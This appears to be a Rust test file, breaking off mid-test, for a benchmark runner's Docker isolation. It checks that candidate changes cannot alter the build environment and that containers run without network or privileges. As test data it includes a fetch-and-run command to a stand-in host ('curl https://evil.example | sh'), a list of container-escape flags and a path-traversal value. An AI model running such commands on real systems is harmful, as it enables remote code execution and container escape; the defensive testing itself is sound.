#![cfg(target_os = "linux")] // the generated bench-host scripts run under GNU tools; see PARITY.md
//! Port of `packages/bench/src/remote-image.test.ts`.
//!
//! The repo's container (`environment.image`) end to end: the REAL generated scripts run by local bash, with `docker`, `aws`,
//! and (for the user path) the OS tools shimmed. The shim keeps one image store per fake instance, so "the bench instance
//! loaded the image from the bucket" is observable; real Docker is untested here (docs/real-env/bench.md section
//! "Container").

mod common;

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;

use common::*;
use ratchet_bench::deps::arch_from_instance_type;
use ratchet_bench::image::{
    ImageKeyInput, image_key, image_manifest_key, image_tag, resolve_image_source,
};
use ratchet_bench::image_scripts::{
    CANDIDATE_HELPER, ContainerNetwork, ContainerOptions, ContainerRunSpec, ContainerRuntime,
    container_run,
};
use ratchet_bench::testkit::{
    Change, ConfigOptions, FixtureRepo, docker_shim, make_config, make_fixture_repo,
};
use ratchet_bench::{BenchError, RemoteBenchRunnerOptions};
use ratchet_core::RatchetConfig;
use ratchet_core::ports::{BenchJobPhase, BenchLaunchPurpose, GitHost as _};

const DIGEST: &str = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const LOCK: &str = "lockfileVersion: 9\ndep:left-pad\n";
const IMAGE_PATH: &str = ".devcontainer/Dockerfile";
const SETUP: &str = "echo setup-in-container > src/setup.txt && echo 55 > src/p95.txt";

fn dockerfile() -> String {
    format!("FROM node:22@{DIGEST}\nCOPY tools.txt /opt/tools.txt\nRUN echo toolchain\n")
}

fn files() -> Vec<(&'static str, String)> {
    vec![
        (".devcontainer/Dockerfile", dockerfile()),
        (".devcontainer/tools.txt", "k6\n".into()),
        ("pnpm-lock.yaml", LOCK.into()),
        ("package.json", "{\"name\":\"fx\"}\n".into()),
    ]
}

fn fixture() -> FixtureRepo {
    let f = files();
    let borrowed: Vec<(&str, &str)> = f.iter().map(|(a, b)| (*a, b.as_str())).collect();
    make_fixture_repo(&borrowed)
}

fn job(sha: &str) -> ratchet_core::ports::BenchJob {
    job_with(sha, |_| {})
}

fn job_with(
    sha: &str,
    f: impl FnOnce(&mut ratchet_core::ports::BenchJob),
) -> ratchet_core::ports::BenchJob {
    common::job_with(sha, |j| {
        j.repeats = 1;
        f(j);
    })
}

fn pnpm_shim(log: &Path) -> String {
    let log = log.display();
    format!(
        r#"
case "${{1:-}}" in
  --version) echo 10.99.0; exit 0;;
  fetch)
    echo "fetch cwd=$PWD store=${{npm_config_store_dir:-}} proxy=${{HTTPS_PROXY:-none}} aws=${{AWS_ACCESS_KEY_ID:-none}}" >> {log}
    s="$npm_config_store_dir/v10"; mkdir -p "$s/files" "$s/projects"
    while read -r l; do n="${{l#dep:}}"; echo "pkg $n" > "$s/files/$n"; done < <(grep '^dep:' pnpm-lock.yaml);;
  install)
    [ "${{npm_config_offline:-}}" = true ] || {{ echo "network needed" >&2; exit 1; }};;
  *) echo "unexpected pnpm $*" >&2; exit 2;;
esac"#
    )
}

/// `cfg({guardrails: [], ...}, environment)`: the standard test config with `environment.image` set (or not).
fn cfg_image(image: Option<&str>) -> RatchetConfig {
    let mut c = make_config(&ConfigOptions {
        guardrails: Some(vec![]),
        ..ConfigOptions::default()
    });
    if let Some(i) = image {
        c.environment = Some(ratchet_core::config::Environment {
            image: Some(i.into()),
            ..Default::default()
        });
    }
    c
}

fn cfg() -> RatchetConfig {
    cfg_image(Some(IMAGE_PATH))
}

struct ImgRig {
    r: Rig,
    docker_log: PathBuf,
}

impl ImgRig {
    fn docker_log(&self) -> String {
        fs::read_to_string(&self.docker_log).unwrap_or_default()
    }

    /// `docker run` lines, in order.
    fn runs(&self) -> Vec<String> {
        self.docker_log()
            .lines()
            .filter(|l| l.starts_with("docker run "))
            .map(str::to_owned)
            .collect()
    }

    /// `launch:<purpose>` entries only.
    fn launches(&self) -> Vec<String> {
        self.r
            .timeline()
            .into_iter()
            .filter(|t| t.starts_with("launch:"))
            .collect()
    }
}

impl std::ops::Deref for ImgRig {
    type Target = Rig;
    fn deref(&self) -> &Rig {
        &self.r
    }
}

fn img_rig(fx: &FixtureRepo, tweak: impl FnOnce(&mut RemoteBenchRunnerOptions)) -> ImgRig {
    let r = rig(fx, &[], tweak);
    let n = seq();
    let docker_log = fx.path().join(format!("docker-{n}.log"));
    r.compute.add_shim(
        "docker",
        &docker_shim(
            &fx.path().join(format!("dockerstate-{n}")),
            &docker_log,
            &r.flags,
        ),
    );
    r.compute.add_shim("pnpm", &pnpm_shim(&r.log));
    r.compute.add_shim("node", "echo v22.22.0");
    ImgRig { r, docker_log }
}

fn cp_dir(from: &Path, to: &Path) {
    fs::create_dir_all(to).expect("mkdir");
    assert!(
        Command::new("cp")
            .arg("-r")
            .arg(format!("{}/.", from.display()))
            .arg(to)
            .status()
            .expect("cp")
            .success()
    );
}

fn count(s: &str, needle: &str) -> usize {
    s.matches(needle).count()
}

fn err(e: &BenchError) -> String {
    e.to_string()
}

/// Is there a `-v X<suffix>:X<suffix>:ro` mount in this docker line (the TypeScript used a back-reference)?
fn has_ro_mount_of(line: &str, suffix: &str) -> bool {
    line.split_whitespace().any(|t| {
        let parts: Vec<&str> = t.split(':').collect();
        parts.len() == 3 && parts[2] == "ro" && parts[0] == parts[1] && parts[0].ends_with(suffix)
    })
}

fn probe_free(runs: Vec<String>) -> Vec<String> {
    runs.into_iter()
        .filter(|l| !l.contains("EXPECT_UID") && !l.contains("rootfs-probe"))
        .collect()
}

mod build_once_from_the_protected_ref_load_offline_run_in_the_container {
    use super::*;

    fn guard_true() -> RatchetConfig {
        let mut c = cfg();
        c.guardrails = make_config(&ConfigOptions {
            guardrails: Some(vec!["- run: \"true\"".into()]),
            ..ConfigOptions::default()
        })
        .guardrails;
        c
    }

    #[tokio::test]
    async fn builds_the_image_on_a_deps_instance_saves_it_content_addressed_then_runs_everything_in_the_container()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        let out = run(&r.runner, &job(&fx.base), &guard_true(), None)
            .await
            .expect("outcome");
        assert_eq!(out.samples, [100.0]); // no setup configured: the bench reads the checkout as it is
        assert_eq!(r.launches(), ["launch:deps", "launch:bench"]);
        let launched: Vec<_> = r
            .compute
            .launched()
            .into_iter()
            .map(|l| (format!("{:?}", l.purpose), l.image_ref))
            .collect();
        assert_eq!(
            launched,
            [
                ("Deps".to_owned(), "ami-test".to_owned()),
                ("Bench".to_owned(), "ami-test".to_owned())
            ]
        );

        // the saved image: archive under bench-images/<key>/<sha256>.<ext>, manifest <key>.json
        let base_dir = fx.path().join("inspect-base");
        fx.host
            .checkout("ratchet/bench", &base_dir)
            .await
            .expect("checkout");
        let resolved = resolve_image_source(&base_dir, IMAGE_PATH).expect("resolves");
        let key = image_key(&ImageKeyInput {
            spec: resolved.spec,
            files: resolved.files,
            arch: arch_from_instance_type("c7i.2xlarge").into(),
        });
        let objs = r.objects("bench-images/");
        assert_eq!(objs.len(), 2, "{objs:?}");
        assert!(objs.contains(&format!("bench-images/{key}.json")));
        let manifest: serde_json::Value = serde_json::from_str(
            &fs::read_to_string(r.bucket_path(&image_manifest_key(&key))).expect("read"),
        )
        .expect("json");
        assert_eq!(
            (
                manifest["v"].clone(),
                manifest["key"].clone(),
                manifest["kind"].clone(),
                manifest["tag"].clone(),
                manifest["arch"].clone()
            ),
            (
                1.into(),
                key.clone().into(),
                "dockerfile".into(),
                image_tag(&key).into(),
                "x86_64".into()
            )
        );
        assert!(
            regex::Regex::new(&format!(
                r"^bench-images/{key}/[0-9a-f]{{64}}\.tar\.(zst|gz)$"
            ))
            .expect("re")
            .is_match(manifest["archive"].as_str().unwrap_or(""))
        );
        assert!(
            regex::Regex::new(r"^sha256:[0-9a-f]{64}$")
                .expect("re")
                .is_match(manifest["imageId"].as_str().unwrap_or(""))
        );

        let log = r.docker_log();
        // built from the BASE tree with the Dockerfile of the repo, pulling fresh bases
        assert!(
            regex::Regex::new(r"(?m)docker build --pull --force-rm --tag ratchet-env:img-[0-9a-f]{40} --file .*\.devcontainer/Dockerfile .*\.devcontainer$").expect("re").is_match(&log),
            "{log}"
        );
        assert!(log.contains("docker save ratchet-env:img-"));
        // the bench instance loaded it (offline, from the bucket) and the id was verified
        assert!(log.contains("docker load"));
        assert!(count(&log, "docker image inspect") >= 2);
    }

    #[tokio::test]
    async fn runs_setup_guardrails_and_the_evaluator_with_network_none_caps_dropped_read_only_root_and_no_new_privileges()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &guard_true(), None)
            .await
            .expect("outcome");
        let runs = probe_free(r.runs());
        assert!(runs.len() >= 2, "guardrail + bench: {runs:?}");
        let forbidden = regex::Regex::new(
            r"--privileged|docker\.sock|seccomp=unconfined|--network host|--pid host",
        )
        .expect("re");
        let tag_re = regex::Regex::new(r"ratchet-env:img-[0-9a-f]{40}").expect("re");
        for l in &runs {
            for f in [
                "--network none",
                "--cap-drop ALL",
                "--security-opt no-new-privileges",
                "--read-only",
                "--pull never",
                "--entrypoint sh",
            ] {
                assert!(l.contains(f), "{f}: {l}");
            }
            assert!(l.contains("--tmpfs /tmp:rw,exec,nosuid,nodev,size=2g"));
            assert!(l.contains("--pids-limit 4096"));
            assert!(!forbidden.is_match(l));
            assert!(tag_re.is_match(l));
        }
    }

    #[tokio::test]
    async fn is_content_addressed_a_second_job_and_a_second_runner_process_reuse_the_image_without_a_new_build_instance()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        r.compute.clear_timeline();
        let builds_before = count(&r.docker_log(), "docker build");
        run(
            &r.runner,
            &job(&fx.candidate(&[("src/p95.txt", Change::write("50"))])),
            &cfg(),
            None,
        )
        .await
        .expect("outcome");
        assert_eq!(r.launches(), ["launch:bench"]);
        // a "restarted app" sharing the bucket
        let r2 = img_rig(&fx, |_| {});
        cp_dir(&r.s3, &r2.s3);
        run(&r2.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        assert_eq!(r2.launches(), ["launch:bench"]);
        assert_eq!(count(&r.docker_log(), "docker build"), builds_before);
    }

    #[tokio::test]
    async fn a_different_dockerfile_at_the_base_ref_or_architecture_is_another_image() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        let df = format!("{}ENV A=b\n", dockerfile());
        let other = make_fixture_repo(&[
            (".devcontainer/Dockerfile", &df),
            (".devcontainer/tools.txt", "k6\n"),
            ("pnpm-lock.yaml", LOCK),
            ("package.json", "{\"name\":\"fx\"}\n"),
        ]);
        let r2 = img_rig(&other, |_| {});
        cp_dir(&r.s3, &r2.s3);
        run(&r2.runner, &job(&other.base), &cfg(), None)
            .await
            .expect("outcome");
        assert_eq!(r2.launches(), ["launch:deps", "launch:bench"]);
        assert_eq!(
            r2.objects("bench-images/")
                .iter()
                .filter(|k| k.ends_with(".json"))
                .count(),
            2
        );
        let arm = img_rig(&fx, |_| {});
        cp_dir(&r.s3, &arm.s3);
        let mut c = cfg();
        c.evaluator.hardware = "c7g.2xlarge".into();
        run(&arm.runner, &job(&fx.base), &c, None)
            .await
            .expect("outcome");
        assert_eq!(arm.launches()[0], "launch:deps");
    }

    #[tokio::test]
    async fn without_environment_image_no_docker_is_involved_at_all() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        let out = run(&r.runner, &job(&fx.base), &cfg_image(None), None)
            .await
            .expect("outcome");
        assert_eq!(out.samples, [100.0]);
        assert_eq!(r.launches(), ["launch:bench"]);
        assert_eq!(r.docker_log(), "");
        assert!(r.objects("bench-images/").is_empty());
    }

    #[tokio::test]
    async fn runs_the_objective_through_the_container_the_bench_sees_the_checkout_and_the_mounted_dirs()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        let bench = "printf '{\"http_req_duration\":{\"p95\":%s},\"cwd\":%s}\\n' \"$(cat src/p95.txt)\" \"$([ -n \"$PWD\" ] && echo 1 || echo 0)\"";
        let mut c = cfg();
        c.evaluator.run = bench.into();
        let out = run(&r.runner, &job(&fx.base), &c, None)
            .await
            .expect("outcome");
        assert_eq!(out.samples, [100.0]);
        assert_eq!(out.runs[0].metrics.get("cwd"), Some(&1.0));
    }
}

mod with_a_dependency_snapshot {
    use super::*;

    #[tokio::test]
    async fn fetches_the_packages_inside_the_container_on_the_egress_instance_and_installs_from_the_snapshot_offline_in_the_container()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        let out = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        // no setup option on this runner: nothing is snapshotted
        assert_eq!(out.samples, [100.0]);
        let r2 = img_rig(&fx, |o| {
            o.setup = Some("pnpm install --frozen-lockfile && echo 55 > src/p95.txt".into())
        });
        let out2 = run(&r2.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        assert_eq!(out2.samples, [55.0]);
        assert_eq!(
            r2.launches(),
            ["launch:deps", "launch:bench"],
            "ONE build instance for image + snapshot"
        );
        let runs = r2.runs();
        let fetch_run = runs
            .iter()
            .find(|l| l.contains("pnpm fetch"))
            .expect("fetch run");
        assert!(
            !fetch_run.contains("--network none"),
            "the one place with egress"
        );
        for f in [
            "--cap-drop ALL",
            "--security-opt no-new-privileges",
            "--read-only",
            "-e npm_config_ignore_scripts=true",
        ] {
            assert!(fetch_run.contains(f), "{f}");
        }
        assert!(
            r2.shim_log().contains("aws=none"),
            "no credentials in the fetch"
        );
        let setup_run = runs
            .iter()
            .find(|l| l.contains("pnpm install"))
            .expect("setup run");
        assert!(setup_run.contains("--network none"));
        assert!(has_ro_mount_of(setup_run, "/deps"), "{setup_run}");
        // the snapshot key is derived from the image, not from the AMI: another Dockerfile means another store
        let manifests: Vec<String> = r2
            .objects("bench-deps/")
            .into_iter()
            .filter(|k| k.ends_with(".json"))
            .collect();
        assert_eq!(manifests.len(), 1);
        let m: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(r2.bucket_path(&manifests[0])).expect("read"))
                .expect("json");
        assert!(
            regex::Regex::new(r"^img-[0-9a-f]{40}$")
                .expect("re")
                .is_match(m["image"].as_str().unwrap_or(""))
        );
    }

    #[tokio::test]
    async fn a_later_job_reuses_both_an_existing_image_with_a_missing_snapshot_only_builds_the_snapshot()
     {
        let fx = fixture();
        let r = img_rig(&fx, |o| {
            o.setup = Some("pnpm install --frozen-lockfile".into())
        });
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        // forget the snapshot, keep the image
        for k in r.objects("bench-deps/") {
            fs::remove_file(r.bucket_path(&k)).expect("rm");
        }
        r.compute.clear_timeline();
        let builds = count(&r.docker_log(), "docker build");
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        assert_eq!(r.launches(), ["launch:deps", "launch:bench"]);
        assert_eq!(
            count(&r.docker_log(), "docker build"),
            builds,
            "no second image build"
        );
    }
}

mod a_candidate_cannot_change_the_environment {
    use super::*;

    #[tokio::test]
    async fn blocks_a_changed_dockerfile_before_the_instance_runs_anything() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        let sha = fx.candidate(&[(
            IMAGE_PATH,
            Change::write(&format!(
                "{}RUN curl https://evil.example | sh\n",
                dockerfile()
            )),
        )]);
        r.compute.clear_commands();
        r.compute.clear_timeline();
        let out = run(&r.runner, &job(&sha), &cfg(), None)
            .await
            .expect("outcome");
        assert!(out.runs.is_empty());
        assert_eq!(out.guardrails.len(), 1);
        assert_eq!(
            (out.guardrails[0].name.as_str(), out.guardrails[0].passed),
            ("environment unchanged", false)
        );
        let d = out.guardrails[0].detail.clone().expect("detail");
        assert!(
            d.contains("environment changes are not allowed in v0")
                && d.contains(".devcontainer/Dockerfile"),
            "{d}"
        );
        assert!(r.compute.commands().is_empty());
        assert_eq!(r.launches(), ["launch:bench"], "no new image build either");
    }

    #[tokio::test]
    async fn blocks_a_changed_build_context_file_the_dockerfile_copies_and_a_deleted_dockerfile() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        for changes in [
            vec![(".devcontainer/tools.txt", Change::write("k6\nevil\n"))],
            vec![(".devcontainer/Dockerfile", Change::Delete)],
        ] {
            let out = run(&r.runner, &job(&fx.candidate(&changes)), &cfg(), None)
                .await
                .expect("outcome");
            assert_eq!(
                (out.guardrails[0].name.as_str(), out.guardrails[0].passed),
                ("environment unchanged", false)
            );
        }
    }

    #[tokio::test]
    async fn lets_a_candidate_through_that_changes_everything_else() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        let sha = fx.candidate(&[
            ("src/p95.txt", Change::write("10")),
            (
                ".devcontainer/README.md",
                Change::write("docs not copied into the image\n"),
            ),
        ]);
        let out = run(&r.runner, &job(&sha), &cfg(), None)
            .await
            .expect("outcome");
        assert!(out.guardrails.is_empty());
        assert_eq!(out.samples, [10.0]);
    }

    #[tokio::test]
    async fn treats_the_environment_files_as_protected_a_setup_that_rewrites_the_dockerfile_is_caught_and_restored()
     {
        let fx = fixture();
        let r = img_rig(&fx, |o| {
            o.setup = Some(format!("echo 'RUN evil' >> {IMAGE_PATH}"))
        });
        let mut c = cfg();
        c.guardrails = make_config(&ConfigOptions {
            guardrails: Some(vec!["- run: \"true\"".into()]),
            ..ConfigOptions::default()
        })
        .guardrails;
        let out = run(&r.runner, &job(&fx.base), &c, None)
            .await
            .expect("outcome");
        assert!(out.runs.is_empty());
        assert!(out.guardrails.iter().any(|g| !g.passed));
    }
}

mod integrity_and_refusals_on_the_bench_instance {
    use super::*;

    #[tokio::test]
    async fn refuses_an_image_whose_bytes_changed_after_the_manifest_was_written() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        let archive = r
            .objects("bench-images/")
            .into_iter()
            .find(|k| !k.ends_with(".json"))
            .expect("archive");
        fs::write(r.bucket_path(&archive), "tampered").expect("tamper");
        let e = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("refused");
        assert!(
            err(&e).contains("sha256 mismatch for the container image"),
            "{e}"
        );
    }

    #[tokio::test]
    async fn refuses_an_image_that_loads_as_another_image_id_than_the_one_the_builder_saw() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        r.flag("bad-id");
        let e = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("refused");
        assert!(err(&e).contains("the loaded image is not sha256:"), "{e}");
    }

    #[tokio::test]
    async fn refuses_a_docker_daemon_without_its_default_seccomp_profile_and_a_missing_daemon() {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        r.flag("no-seccomp");
        let e = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("refused");
        assert!(
            err(&e).contains("without its default seccomp profile"),
            "{e}"
        );
        let r2 = img_rig(&fx, |o| {
            o.container = Some(ContainerOptions {
                daemon_wait_attempts: Some(1),
                ..ContainerOptions::default()
            })
        });
        cp_dir(&r.s3, &r2.s3);
        r2.flag("no-daemon");
        let e = run(&r2.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("refused");
        assert!(err(&e).contains("docker daemon is not running"), "{e}");
    }

    #[tokio::test]
    async fn refuses_when_the_probe_of_the_container_fails_for_example_a_network_interface_inside()
    {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        r.flag("probe-fails");
        let e = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("refused");
        assert!(
            err(&e).contains("container probe failed: network interfaces visible"),
            "{e}"
        );
    }

    #[tokio::test]
    async fn turns_a_failed_image_build_into_an_infrastructure_error_that_says_where_to_look_and_terminates_the_instance()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        r.flag("fail-build");
        let e = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("fails");
        let re = regex::Regex::new(r"(?s)building the container image from .*Dockerfile failed.*registries the Dockerfile pulls from").expect("re");
        assert!(re.is_match(&err(&e)), "{e}");
        assert_eq!(r.compute.terminated().len(), 1);
        assert_eq!(r.launches(), ["launch:deps"]);
        let again = run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect_err("fails again");
        assert!(matches!(again, BenchError::Infra(_)));
    }

    #[tokio::test]
    async fn rejects_an_environment_image_that_is_not_a_path_inside_the_repository_before_anything_is_launched()
     {
        let fx = fixture();
        let r = img_rig(&fx, |_| {});
        let e = run(
            &r.runner,
            &job(&fx.base),
            &cfg_image(Some("../../etc/Dockerfile")),
            None,
        )
        .await
        .expect_err("refused");
        assert!(err(&e).contains("must stay inside the repository"), "{e}");
        assert!(r.launches().is_empty());
    }
}

#[tokio::test]
async fn a_devcontainer_that_names_a_registry_image_is_pulled_and_tagged_instead_of_built() {
    let dc = make_fixture_repo(&[(
        ".devcontainer/devcontainer.json",
        "{ // toolchain\n \"image\": \"mcr.microsoft.com/devcontainers/base:ubuntu\",\n }",
    )]);
    let r = img_rig(&dc, |_| {});
    run(
        &r.runner,
        &job(&dc.base),
        &cfg_image(Some(".devcontainer/devcontainer.json")),
        None,
    )
    .await
    .expect("outcome");
    assert!(
        r.docker_log()
            .contains("docker pull mcr.microsoft.com/devcontainers/base:ubuntu")
    );
    assert!(!r.docker_log().contains("docker build"));
}

mod isolation_user_container {
    use super::*;

    /// A stand-in for the setuid launcher: a file with the given mode inside the fixture directory (removed with it).
    fn helper(fx: &FixtureRepo, name: &str, mode: u32) -> String {
        let p = fx.path().join(name);
        fs::write(&p, "#!/bin/sh\n").expect("write");
        fs::set_permissions(&p, fs::Permissions::from_mode(mode)).expect("chmod");
        p.to_string_lossy().into_owned()
    }

    fn id_shim() -> String {
        r#"
case "$1 $2" in
  "-u ratchet-bench") echo 1001; exit 0;;
  "-g ratchet-bench") echo 1001; exit 0;;
  "-u ratchet-holdout") echo 1002; exit 0;;
  "-g ratchet-holdout") echo 1002; exit 0;;
  "-u ratchet-deps") echo 1003; exit 0;;
  "-g ratchet-deps") echo 1003; exit 0;;
  "-nG ratchet-bench"|"-nG ratchet-holdout") echo "${RATCHET_TEST_GROUPS:-ratchet}"; exit 0;;
esac
exec /usr/bin/id "$@""#
            .to_owned()
    }

    fn user_img_rig(
        fx: &FixtureRepo,
        helper_path: &str,
        overrides: &[(&str, &str)],
        tweak: impl FnOnce(&mut RemoteBenchRunnerOptions),
    ) -> ImgRig {
        let n = seq();
        let _ = n;
        let helper_path = helper_path.to_owned();
        let r = img_rig(fx, |o| {
            o.isolation = ratchet_bench::Isolation::User;
            o.container = Some(ContainerOptions {
                helper_path: Some(helper_path),
                verify_helper_owner: Some(false),
                ..ContainerOptions::default()
            });
            tweak(o);
        });
        let mut shims = user_shims(&r.log, &[("id", &id_shim()), ("pkill", "exit 0")]);
        shims.retain(|(name, _)| name != "ratchet-candidate");
        for (name, body) in overrides {
            shims.retain(|(n, _)| n != name);
            shims.push(((*name).to_owned(), (*body).to_owned()));
        }
        install(&r.compute, &shims);
        r
    }

    fn std_helper(fx: &FixtureRepo) -> String {
        helper(fx, "ratchet-candidate-ctr", 0o4755)
    }

    #[tokio::test]
    async fn setup_and_guardrails_run_as_the_bench_uid_the_harness_as_the_holdout_uid_with_only_setuid_setgid_and_the_launcher()
     {
        let fx = fixture();
        let hp = std_helper(&fx);
        let r = user_img_rig(&fx, &hp, &[], |o| o.setup = Some(SETUP.into()));
        fs::create_dir_all(r.s3.join(BUCKET)).expect("mkdir");
        fs::write(r.s3.join(BUCKET).join("trace.json"), "{\"requests\":[1]}").expect("write");
        let c = make_config(&ConfigOptions {
            guardrails: Some(vec!["- run: \"true\"".into()]),
            confirm_trace: Some(format!("s3://{BUCKET}/trace.json")),
            environment_image: Some(IMAGE_PATH.into()),
            ..ConfigOptions::default()
        });
        let out = run(
            &r.runner,
            &job_with(&fx.base, |j| j.phase = BenchJobPhase::Confirm),
            &c,
            None,
        )
        .await
        .expect("outcome");
        assert_eq!(out.samples, [55.0]);

        let runs: Vec<String> = r
            .runs()
            .into_iter()
            .filter(|l| {
                !l.contains("EXPECT_UID=")
                    && !l.contains("rootfs-probe")
                    && !l.contains("HARNESS_UID=")
            })
            .collect();
        let setup_run = runs
            .iter()
            .find(|l| l.contains("setup-in-container"))
            .expect("setup run");
        let bench = runs
            .iter()
            .find(|l| l.contains("bench.sh"))
            .expect("bench run");

        // candidate user: numeric uid of ratchet-bench, nothing added back, no holdout, no helper
        assert!(setup_run.contains("--user 1001:1001"));
        assert!(!setup_run.contains("--cap-add"));
        assert!(setup_run.contains("--security-opt no-new-privileges"));
        assert!(!setup_run.contains("holdout") && !setup_run.contains("/ratchet/candidate"));
        assert!(setup_run.contains("-e USER=ratchet-bench"));

        // harness: the holdout uid, SETUID/SETGID for the launcher, the holdout read-only, the helper and its config read-only
        assert!(bench.contains("--user 1002:1002"));
        assert!(bench.contains("--cap-drop ALL --cap-add SETUID --cap-add SETGID"));
        assert!(
            !bench.contains("--security-opt no-new-privileges"),
            "the launcher is setuid; it sets no_new_privs itself"
        );
        assert!(has_ro_mount_of(bench, "/holdout"), "{bench}");
        assert!(bench.contains(&format!("-v {hp}:/ratchet/candidate:ro")));
        assert!(
            regex::Regex::new(r"-v \S+/launcher\.conf:/ratchet/launcher\.conf:ro")
                .expect("re")
                .is_match(bench)
        );
        assert!(bench.contains("-e RATCHET_CANDIDATE_EXEC=/ratchet/candidate"));
        assert!(bench.contains("-e RATCHET_TRACE"));
        assert!(bench.contains("--network none") && bench.contains("--read-only"));
        // the sealed bucket is never mentioned in a container command
        assert!(!runs.join("\n").contains("trace.json"));
    }

    #[tokio::test]
    async fn the_bench_phase_never_mounts_a_holdout_the_launcher_config_names_the_caller_and_the_target_uids()
     {
        let fx = fixture();
        let r = user_img_rig(&fx, &std_helper(&fx), &[], |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        let runs = r.runs();
        let bench = runs
            .iter()
            .find(|l| l.contains("bench.sh"))
            .expect("bench run");
        assert!(
            !bench.contains("/holdout:") && !bench.contains("RATCHET_TRACE"),
            "{bench}"
        );
        let script = r
            .compute
            .scripts()
            .into_iter()
            .find(|s| s.contains("launcher.conf") && s.contains("bench.sh"))
            .expect("script");
        assert!(
            script.contains(
                "printf '%s %s %s\\n' \"$HUID\" \"$BUID\" \"$BGID\" > \"$W/launcher.conf\""
            )
        );
        let conf = list_children(&r.work_root)
            .into_iter()
            .map(|j| j.join("launcher.conf"))
            .find(|f| f.exists())
            .expect("launcher.conf");
        assert_eq!(
            fs::read_to_string(conf).expect("read").trim(),
            "1002 1001 1001"
        ); // caller (holdout uid), target uid, target gid
    }

    #[tokio::test]
    async fn does_not_run_the_host_launcher_check_in_container_mode_and_probes_the_setup_and_harness_containers_instead()
     {
        let fx = fixture();
        let r = user_img_rig(&fx, &std_helper(&fx), &[], |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("outcome");
        assert!(!r.shim_log().contains("ratchet-candidate id -un"));
        let probes: Vec<String> = r
            .runs()
            .into_iter()
            .filter(|l| l.contains("EXPECT_UID=") || l.contains("HARNESS_UID="))
            .collect();
        assert!(probes.len() >= 2);
        assert!(probes.iter().any(|p| p.contains("--cap-add SETUID")));
        assert!(
            probes
                .iter()
                .any(|p| p.contains("--security-opt no-new-privileges"))
        );
    }

    async fn refuses(r: &ImgRig, base: &str, re: &str) {
        r.compute.clear_commands();
        let e = run(&r.runner, &job(base), &cfg(), None)
            .await
            .expect_err("refused");
        assert!(
            regex::Regex::new(&format!("(?s){re}"))
                .expect("re")
                .is_match(&err(&e)),
            "{e}"
        );
        // nothing candidate-controlled ran
        assert!(r.compute.scripts().iter().all(|s| !s.contains("bench.sh")));
    }

    #[tokio::test]
    async fn refuses_to_run_candidate_code_with_a_launcher_that_is_not_setuid_root() {
        let fx = fixture();
        let plain = helper(&fx, "plain", 0o755);
        let r = user_img_rig(&fx, &plain, &[], |_| {});
        refuses(&r, &fx.base, "not a setuid root file").await;
    }

    #[tokio::test]
    async fn refuses_to_run_candidate_code_when_a_bench_user_could_reach_the_docker_socket_group_docker()
     {
        let fx = fixture();
        let id = r#"case "$1 $2" in "-nG ratchet-bench"|"-nG ratchet-holdout") echo "ratchet docker"; exit 0;; "-u ratchet-bench"|"-g ratchet-bench") echo 1001; exit 0;; "-u ratchet-holdout"|"-g ratchet-holdout") echo 1002; exit 0;; esac; exit 0"#;
        let r = user_img_rig(&fx, &std_helper(&fx), &[("id", id)], |_| {});
        refuses(&r, &fx.base, "privileged group").await;
    }

    #[tokio::test]
    async fn refuses_to_run_candidate_code_when_the_setup_container_probe_finds_a_problem() {
        let fx = fixture();
        let r = user_img_rig(&fx, &std_helper(&fx), &[], |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("builds + a clean run");
        r.flag("probe-fails");
        refuses(&r, &fx.base, "container probe failed").await;
    }

    #[tokio::test]
    async fn refuses_to_run_candidate_code_when_the_harness_probe_finds_the_holdout_readable_by_candidate_processes()
     {
        let fx = fixture();
        let r = user_img_rig(&fx, &std_helper(&fx), &[], |_| {});
        run(&r.runner, &job(&fx.base), &cfg(), None)
            .await
            .expect("builds + a clean run");
        r.flag("harness-probe-fails");
        refuses(
